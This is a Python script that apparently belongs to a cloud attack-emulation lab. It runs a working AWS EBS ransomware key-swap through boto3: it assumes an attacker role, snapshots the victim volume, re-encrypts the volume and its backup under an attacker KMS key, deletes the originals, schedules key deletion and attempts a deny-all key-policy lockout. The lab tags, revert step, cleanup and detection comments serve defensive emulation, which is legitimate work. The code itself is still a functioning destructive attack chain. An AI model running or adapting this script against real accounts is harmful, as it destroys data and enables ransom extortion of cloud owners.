# FILE: attack.py
"""
ATOMIC-EBS-RANSOMWARE-KMS - Automated Post-Exploitation Attack Script
3-phase EBS ransomware key-swap: establish attacker session, enumerate targets,
snapshot live volume, re-encrypt both snapshots under attacker CMK, delete
originals, schedule CMK deletion (ransom demand), attempt deny-guarded
PutKeyPolicy, cancel deletion in revert. (T1486 - Data Encrypted for Impact)
"""
import sys
import time
import random
import json

# Cross-platform UTF-8 output - prevents UnicodeEncodeError on Windows CP1252 terminals
if hasattr(sys.stdout, "reconfigure"):
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
if hasattr(sys.stderr, "reconfigure"):
    sys.stderr.reconfigure(encoding="utf-8", errors="replace")

import boto3
from botocore.exceptions import ClientError


# ── Helpers ──────────────────────────────────────────────────────────────────

_TENANT_CREDS = {}


def _set_tenant_credentials(outputs):
    """Remember the tenant's short-lived credentials. In the MayaTrail backend the
    worker injects them as outputs['_aws_credentials']; without this the first STS
    call would run as the Celery worker identity instead of the tenant account."""
    _TENANT_CREDS.clear()
    _TENANT_CREDS.update((outputs or {}).get("_aws_credentials") or {})


def _base_session(region):
    """Session for the tenant's connected role, or the ambient default session for
    standalone runs where no credentials were injected."""
    if _TENANT_CREDS:
        return boto3.Session(
            aws_access_key_id=_TENANT_CREDS.get("AWS_ACCESS_KEY_ID"),
            aws_secret_access_key=_TENANT_CREDS.get("AWS_SECRET_ACCESS_KEY"),
            aws_session_token=_TENANT_CREDS.get("AWS_SESSION_TOKEN"),
            region_name=region,
        )
    return boto3.Session(region_name=region)


def op_delay(min_s: float = 2.0, max_s: float = 6.0) -> None:
    time.sleep(random.uniform(min_s, max_s))


def phase_delay() -> None:
    time.sleep(random.uniform(5, 15))


def print_step(msg: str) -> None:
    print(f"\n[*] {msg}")


def print_ok(msg: str) -> None:
    print(f"[+] {msg}")


def print_err(msg: str) -> None:
    print(f"[-] {msg}")


def _require(outputs: dict, key: str) -> str:
    val = outputs.get(key)
    if not val:
        raise RuntimeError(
            f"Required output key '{key}' is missing or empty in Pulumi stack outputs"
        )
    return val


def _poll_snapshot(ec2_client, snapshot_id: str, poll_interval: int = 15, timeout_s: int = 900) -> None:
    """Poll a single snapshot until State == completed or error."""
    deadline = time.time() + timeout_s
    while time.time() < deadline:
        resp = ec2_client.describe_snapshots(SnapshotIds=[snapshot_id])
        snaps = resp.get("Snapshots", [])
        if not snaps:
            raise RuntimeError(f"Snapshot {snapshot_id} not found during polling")
        state = snaps[0]["State"]
        progress = snaps[0].get("Progress", "?")
        if state == "completed":
            print_ok(f"Snapshot {snapshot_id} completed")
            return
        if state == "error":
            raise RuntimeError(f"Snapshot {snapshot_id} entered error state")
        print(f"    waiting on {snapshot_id}: {state} {progress}")
        time.sleep(poll_interval)
    raise RuntimeError(f"Snapshot {snapshot_id} did not complete within {timeout_s}s")


def _poll_snapshots_concurrent(
    ec2_client, snapshot_ids: list, poll_interval: int = 15, timeout_s: int = 900
) -> None:
    """Poll multiple snapshots together until all reach State == completed."""
    pending = set(s for s in snapshot_ids if s)
    deadline = time.time() + timeout_s
    while pending and time.time() < deadline:
        resp = ec2_client.describe_snapshots(SnapshotIds=list(pending))
        for snap in resp.get("Snapshots", []):
            sid = snap["SnapshotId"]
            state = snap["State"]
            progress = snap.get("Progress", "?")
            if state == "completed":
                pending.discard(sid)
                print_ok(f"Snapshot {sid} completed")
            elif state == "error":
                raise RuntimeError(f"Snapshot {sid} entered error state")
            else:
                print(f"    waiting on {sid}: {state} {progress}")
        if pending:
            time.sleep(poll_interval)
    if pending:
        raise RuntimeError(f"Snapshots {pending} did not complete within {timeout_s}s")



def _assume_attacker(region, role_arn):
    """Assume the account-root-trusted attacker role (no long-lived keys). Retries for IAM propagation."""
    base = _base_session(region)
    last = None
    for _ in range(10):
        try:
            c = base.client("sts").assume_role(RoleArn=role_arn, RoleSessionName="atomic-attacker")["Credentials"]
            return boto3.Session(aws_access_key_id=c["AccessKeyId"], aws_secret_access_key=c["SecretAccessKey"],
                                 aws_session_token=c["SessionToken"], region_name=region)
        except ClientError as e:
            last = e
            time.sleep(3)
    raise last

# ── Entry point (backend contract) ───────────────────────────────────────────

def run(outputs: dict, region: str = "us-east-1") -> None:
    """
    EBS ransomware key-swap emulation (T1486).
    All credentials and resource IDs are read from the Pulumi stack outputs dict.
    """

    # ── Resolve required Pulumi outputs ─────────────────────────────────────
    _set_tenant_credentials(outputs)

    attacker_role_arn  = _require(outputs, "attacker_role_arn")
    attacker_kms_arn   = _require(outputs, "attacker_kms_key_arn")
    victim_volume_id   = _require(outputs, "victim_ebs_volume_id")
    victim_snapshot_id = _require(outputs, "victim_ebs_snapshot_id")

    # ── Build attacker session (single static key for the full chain) ────────
    # Tradecraft: real ransomware actors pre-stage a single long-lived access key
    # for the full attack chain; avoids additional API calls that generate telemetry
    attacker_session = _assume_attacker(region, attacker_role_arn)
    sts = attacker_session.client("sts")
    ec2 = attacker_session.client("ec2", region_name=region)
    kms = attacker_session.client("kms", region_name=region)

    # Track attack-created snapshots so cleanup can always delete them
    staging_snapshot_id            = None
    reencrypted_backup_snapshot_id = None
    reencrypted_live_snapshot_id   = None

    # Collect generated CloudTrail events for end-of-run summary
    events: list = []

    try:
        # ================================================================
        # PHASE 1 - Credential Establishment and Target Discovery
        # ================================================================
        print_step("PHASE 1 - Credential establishment and target discovery")
        phase_delay()

        # -- Step 1: GetCallerIdentity - confirm attacker-role is valid --------
        print_step("Step 1 - GetCallerIdentity: confirm attacker-role credentials")
        try:
            identity = sts.get_caller_identity()
            print_ok(f"Attacker ARN   : {identity['Arn']}")
            print_ok(f"Account        : {identity['Account']}")
            print_ok(f"UserId         : {identity['UserId']}")
            events.append("GetCallerIdentity (sts.amazonaws.com)")
        except ClientError as exc:
            raise RuntimeError(f"GetCallerIdentity failed - attacker credentials invalid: {exc}")
        op_delay(2, 4)

        # -- Step 2: Enumerate lab-tagged EBS resources (reconnaissance telemetry) --
        # Tradecraft: tag-scoped allow policy means the attacker must enumerate
        # to discover reachable resource IDs; generates DescribeVolumes/DescribeSnapshots
        # events that detection rules can alert on (unusual describe from new principal)
        print_step("Step 2 - DescribeVolumes: enumerate lab-tagged EBS volumes")
        try:
            vol_resp = ec2.describe_volumes(
                Filters=[{"Name": "tag:MayaTrail", "Values": ["true"]}]
            )
            found_volumes = [v["VolumeId"] for v in vol_resp.get("Volumes", [])]
            print_ok(f"DescribeVolumes result: {found_volumes}")
            events.append("DescribeVolumes (ec2.amazonaws.com)")
            if victim_volume_id not in found_volumes:
                print_err(
                    f"Exported victim volume {victim_volume_id} not in describe results "
                    f"- proceeding with exported ID"
                )
        except ClientError as exc:
            print_err(f"DescribeVolumes: {exc}")
        op_delay(2, 5)

        print_step("Step 2b - DescribeSnapshots: enumerate lab-tagged EBS snapshots")
        try:
            snap_resp = ec2.describe_snapshots(
                Filters=[{"Name": "tag:MayaTrail", "Values": ["true"]}],
                OwnerIds=["self"],
            )
            found_snaps = [s["SnapshotId"] for s in snap_resp.get("Snapshots", [])]
            print_ok(f"DescribeSnapshots result: {found_snaps}")
            events.append("DescribeSnapshots (ec2.amazonaws.com)")
            if victim_snapshot_id not in found_snaps:
                print_err(
                    f"Exported victim snapshot {victim_snapshot_id} not in describe results "
                    f"- proceeding with exported ID"
                )
        except ClientError as exc:
            print_err(f"DescribeSnapshots: {exc}")
        op_delay(2, 5)

        # ================================================================
        # PHASE 2 - Ransomware Execution: Snapshot -> Re-encrypt -> Delete
        # ================================================================
        print_step("PHASE 2 - Ransomware execution: snapshot, re-encrypt, delete originals")
        phase_delay()

        # -- Step 3: CreateSnapshot of live victim volume ----------------------
        # Tradecraft: must capture live data before deleting the volume;
        # the staging snapshot will be re-encrypted under attacker CMK in step 5
        print_step(f"Step 3 - CreateSnapshot: capture live volume {victim_volume_id}")
        try:
            create_resp = ec2.create_snapshot(
                VolumeId=victim_volume_id,
                Description="ransomware-staging",
                TagSpecifications=[
                    {
                        "ResourceType": "snapshot",
                        "Tags": [
                            {"Key": "Lab",           "Value": "ebs-ransomware-kms"},
                            {"Key": "AttackCreated", "Value": "true"},
                            {"Key": "MayaTrail",     "Value": "true"},
                        ],
                    }
                ],
            )
            staging_snapshot_id = create_resp["SnapshotId"]
            print_ok(f"Staging snapshot created: {staging_snapshot_id}")
            events.append(f"CreateSnapshot (ec2.amazonaws.com) -> {staging_snapshot_id}")
        except ClientError as exc:
            raise RuntimeError(f"CreateSnapshot failed: {exc}")

        # Poll staging snapshot until completed before starting step 5 copy
        print_step(f"Polling staging snapshot {staging_snapshot_id} (this may take 1-3 min)")
        _poll_snapshot(ec2, staging_snapshot_id, poll_interval=15, timeout_s=900)
        op_delay(2, 5)

        # -- Step 4: CopySnapshot - re-encrypt victim BACKUP under attacker CMK -
        # Tradecraft: copying with attacker KmsKeyId transfers custody of the backup;
        # the victim CMK (lab-kms-key) can no longer decrypt this copy -
        # the backup is now under attacker control (ransom leverage point 1 of 2)
        print_step(
            f"Step 4 - CopySnapshot: re-encrypt victim backup snapshot "
            f"{victim_snapshot_id} under attacker CMK"
        )
        try:
            copy4_resp = ec2.copy_snapshot(
                SourceSnapshotId=victim_snapshot_id,
                SourceRegion=region,
                Encrypted=True,
                KmsKeyId=attacker_kms_arn,
                Description="ransomware-reencrypted-backup",
                TagSpecifications=[
                    {
                        "ResourceType": "snapshot",
                        "Tags": [
                            {"Key": "Lab",           "Value": "ebs-ransomware-kms"},
                            {"Key": "AttackCreated", "Value": "true"},
                            {"Key": "MayaTrail",     "Value": "true"},
                        ],
                    }
                ],
            )
            reencrypted_backup_snapshot_id = copy4_resp["SnapshotId"]
            print_ok(f"Re-encrypted backup snapshot started: {reencrypted_backup_snapshot_id}")
            events.append(
                f"CopySnapshot backup (ec2.amazonaws.com) "
                f"KmsKeyId=attacker-CMK -> {reencrypted_backup_snapshot_id}"
            )
        except ClientError as exc:
            raise RuntimeError(f"CopySnapshot (backup) failed: {exc}")
        op_delay(2, 5)

        # -- Step 5: CopySnapshot - re-encrypt STAGING snapshot under attacker CMK -
        # Tradecraft: two CopySnapshot calls with attacker KmsKeyId in rapid succession
        # is the two-snapshot ransomware key-swap signature; detections should fire on
        # this pattern (live + backup both re-keyed) not just single CopySnapshot events
        print_step(
            f"Step 5 - CopySnapshot: re-encrypt staging snapshot "
            f"{staging_snapshot_id} under attacker CMK"
        )
        try:
            copy5_resp = ec2.copy_snapshot(
                SourceSnapshotId=staging_snapshot_id,
                SourceRegion=region,
                Encrypted=True,
                KmsKeyId=attacker_kms_arn,
                Description="ransomware-reencrypted-live",
                TagSpecifications=[
                    {
                        "ResourceType": "snapshot",
                        "Tags": [
                            {"Key": "Lab",           "Value": "ebs-ransomware-kms"},
                            {"Key": "AttackCreated", "Value": "true"},
                            {"Key": "MayaTrail",     "Value": "true"},
                        ],
                    }
                ],
            )
            reencrypted_live_snapshot_id = copy5_resp["SnapshotId"]
            print_ok(f"Re-encrypted live snapshot started: {reencrypted_live_snapshot_id}")
            events.append(
                f"CopySnapshot live (ec2.amazonaws.com) "
                f"KmsKeyId=attacker-CMK -> {reencrypted_live_snapshot_id}"
            )
        except ClientError as exc:
            raise RuntimeError(f"CopySnapshot (live) failed: {exc}")

        # Poll both re-encrypted copies concurrently - must finish before deleting originals
        print_step(
            f"Polling re-encrypted snapshots until both completed "
            f"({reencrypted_backup_snapshot_id}, {reencrypted_live_snapshot_id})"
        )
        _poll_snapshots_concurrent(
            ec2,
            [reencrypted_backup_snapshot_id, reencrypted_live_snapshot_id],
            poll_interval=15,
            timeout_s=900,
        )
        op_delay(2, 6)

        # -- Step 6: DeleteVolume - destroy original victim volume -------------
        # Tradecraft: with attacker-encrypted copies ready, destroying the original
        # completes the ransomware setup; victim has no accessible, decryptable copy
        print_step(f"Step 6 - DeleteVolume: destroy original victim volume {victim_volume_id}")
        try:
            ec2.delete_volume(VolumeId=victim_volume_id)
            print_ok(f"Deleted victim volume {victim_volume_id}")
            events.append(f"DeleteVolume (ec2.amazonaws.com) {victim_volume_id}")
        except ClientError as exc:
            code = exc.response["Error"]["Code"]
            if code == "InvalidVolume.NotFound":
                print_ok(f"Volume {victim_volume_id} already absent - idempotent")
                events.append(f"DeleteVolume (ec2.amazonaws.com) {victim_volume_id} [already absent]")
            else:
                raise RuntimeError(f"DeleteVolume failed: {exc}")
        op_delay(2, 6)

        # -- Step 7: DeleteSnapshot - destroy original victim backup -----------
        # Tradecraft: removing the backup eliminates the last victim-controlled
        # decryptable copy; victim now has no recovery path without the attacker CMK
        print_step(f"Step 7 - DeleteSnapshot: destroy original victim backup {victim_snapshot_id}")
        try:
            ec2.delete_snapshot(SnapshotId=victim_snapshot_id)
            print_ok(f"Deleted victim backup snapshot {victim_snapshot_id}")
            events.append(f"DeleteSnapshot (ec2.amazonaws.com) {victim_snapshot_id}")
        except ClientError as exc:
            code = exc.response["Error"]["Code"]
            if code == "InvalidSnapshot.NotFound":
                print_ok(f"Snapshot {victim_snapshot_id} already absent - idempotent")
                events.append(f"DeleteSnapshot (ec2.amazonaws.com) {victim_snapshot_id} [already absent]")
            else:
                raise RuntimeError(f"DeleteSnapshot failed: {exc}")
        op_delay(2, 6)

        # ================================================================
        # PHASE 3 - Key Manipulation: Ransom Demand, Lockout Attempt, Revert
        # ================================================================
        print_step("PHASE 3 - Key manipulation: ransom demand, lockout attempt, revert")
        phase_delay()

        # -- Step 8: ScheduleKeyDeletion - ransom demand simulation -----------
        # Tradecraft: scheduling the attacker CMK for deletion makes all re-encrypted
        # data permanently unrecoverable at key expiry; the 7-day window mirrors real
        # ransomware payment deadlines. Detection: KMS.3 fires within seconds of
        # DeleteVolume/DeleteSnapshot - the timing correlation is the ransomware signature
        print_step(f"Step 8 - ScheduleKeyDeletion: ransom demand (7-day window) on {attacker_kms_arn}")
        try:
            kms.schedule_key_deletion(KeyId=attacker_kms_arn, PendingWindowInDays=7)
            print_ok(f"Scheduled deletion of attacker CMK {attacker_kms_arn} (7-day pending window)")
            events.append(f"ScheduleKeyDeletion (kms.amazonaws.com) {attacker_kms_arn}")
        except ClientError as exc:
            code = exc.response["Error"]["Code"]
            if code == "KMSInvalidStateException":
                # Key may already be pending deletion from a prior run
                print_ok(f"Key already in pending deletion or incompatible state - continuing: {exc}")
                events.append(f"ScheduleKeyDeletion (kms.amazonaws.com) {attacker_kms_arn} [state conflict]")
            else:
                raise RuntimeError(f"ScheduleKeyDeletion failed: {exc}")
        op_delay(2, 6)

        # -- Step 9: PutKeyPolicy - deny-guarded account lockout attempt -------
        # Tradecraft: ransomware actors attempt to lock the account owner out of
        # the encryption key so even key recovery is blocked. The deny-guard-policy
        # on attacker-role has an explicit IAM Deny on kms:PutKeyPolicy - the call
        # returns AccessDenied and CloudTrail records the attempt.
        # IMPORTANT: detection rules must NOT filter errorCode IS NULL for this event -
        # the AccessDenied record IS the signal for a key-policy lockout attempt.
        print_step(f"Step 9 - PutKeyPolicy: deny-guarded account lockout attempt on {attacker_kms_arn}")
        lockout_policy = json.dumps({
            "Version": "2012-10-17",
            "Statement": [
                {
                    "Effect": "Deny",
                    "Principal": "*",
                    "Action": "kms:*",
                    "Resource": "*",
                }
            ],
        })
        try:
            kms.put_key_policy(
                KeyId=attacker_kms_arn,
                PolicyName="default",
                Policy=lockout_policy,
            )
            # Deny-guard should have prevented this; if it succeeded, undo immediately
            print_err(
                "PutKeyPolicy SUCCEEDED - deny-guard-policy did not fire; "
                "reverting key policy immediately"
            )
            try:
                account_id = sts.get_caller_identity()["Account"]
                safe_policy = json.dumps({
                    "Version": "2012-10-17",
                    "Statement": [
                        {
                            "Effect": "Allow",
                            "Principal": {"AWS": f"arn:aws:iam::{account_id}:root"},
                            "Action": "kms:*",
                            "Resource": "*",
                        }
                    ],
                })
                kms.put_key_policy(
                    KeyId=attacker_kms_arn,
                    PolicyName="default",
                    Policy=safe_policy,
                )
                print_ok("Key policy reverted to safe account-root policy")
            except ClientError as revert_exc:
                print_err(f"Could not revert key policy: {revert_exc}")
            raise RuntimeError(
                "PutKeyPolicy succeeded but should have been blocked by deny-guard-policy "
                "- check IAM deny policy configuration"
            )
        except ClientError as exc:
            code = exc.response["Error"]["Code"]
            if code in ("AccessDeniedException", "AccessDenied"):
                # Expected outcome - deny-guard fired as designed
                print_ok(
                    "PutKeyPolicy returned AccessDenied - deny-guard fired as expected; "
                    "CloudTrail records the attempt with errorCode: AccessDenied"
                )
                events.append(
                    f"PutKeyPolicy (kms.amazonaws.com) errorCode=AccessDenied [deny-guard fired]"
                )
            else:
                print_err(f"PutKeyPolicy unexpected error {code}: {exc}")
                events.append(f"PutKeyPolicy (kms.amazonaws.com) errorCode={code}")
        op_delay(2, 5)

        # -- Step 10: CancelKeyDeletion - revert ransom key to Enabled state ---
        # Tradecraft: marks end of dwell period; required so Pulumi destroy can
        # cleanly remove the KMS key resource (destroy re-schedules deletion at teardown)
        print_step(f"Step 10 - CancelKeyDeletion: restore attacker CMK to Enabled state")
        try:
            kms.cancel_key_deletion(KeyId=attacker_kms_arn)
            print_ok(f"CancelKeyDeletion: attacker CMK {attacker_kms_arn} restored to Enabled")
            events.append(f"CancelKeyDeletion (kms.amazonaws.com) {attacker_kms_arn}")
        except ClientError as exc:
            code = exc.response["Error"]["Code"]
            if code == "KMSInvalidStateException":
                print_ok(f"Key not in PendingDeletion state (may have been cancelled already): {exc}")
                events.append(f"CancelKeyDeletion (kms.amazonaws.com) {attacker_kms_arn} [state conflict]")
            else:
                print_err(f"CancelKeyDeletion failed: {exc}")
                events.append(f"CancelKeyDeletion (kms.amazonaws.com) {attacker_kms_arn} [FAILED]")
        op_delay(2, 5)

    finally:
        # ================================================================
        # CLEANUP - delete all attack-created snapshots
        # victim_volume_id and victim_snapshot_id were deleted during the attack;
        # Pulumi destroy handles their absence gracefully.
        # The 3 attack-created snapshots must be explicitly cleaned up here.
        # ================================================================
        print_step("CLEANUP - deleting attack-created snapshots")
        for snap_id, label in [
            (staging_snapshot_id,            "staging"),
            (reencrypted_backup_snapshot_id, "re-encrypted backup"),
            (reencrypted_live_snapshot_id,   "re-encrypted live"),
        ]:
            if not snap_id:
                continue
            try:
                ec2.delete_snapshot(SnapshotId=snap_id)
                print_ok(f"Deleted {label} snapshot {snap_id}")
            except ClientError as exc:
                code = exc.response["Error"]["Code"]
                if code == "InvalidSnapshot.NotFound":
                    print_ok(f"{label} snapshot {snap_id} already absent")
                else:
                    print_err(f"Cleanup - could not delete {label} snapshot {snap_id}: {exc}")

    # ── Attack chain summary ─────────────────────────────────────────────────
    print("\n" + "=" * 64)
    print("ATTACK CHAIN SUMMARY - CloudTrail Events Generated")
    print("=" * 64)
    for i, evt in enumerate(events, 1):
        print(f"  {i:02d}. {evt}")
    print("=" * 64)
    print(f"Total events generated : {len(events)}")
    print(f"MITRE tactic covered   : Impact (T1486 - Data Encrypted for Impact)")
    print("Next step              : pulumi destroy to tear down lab infrastructure")
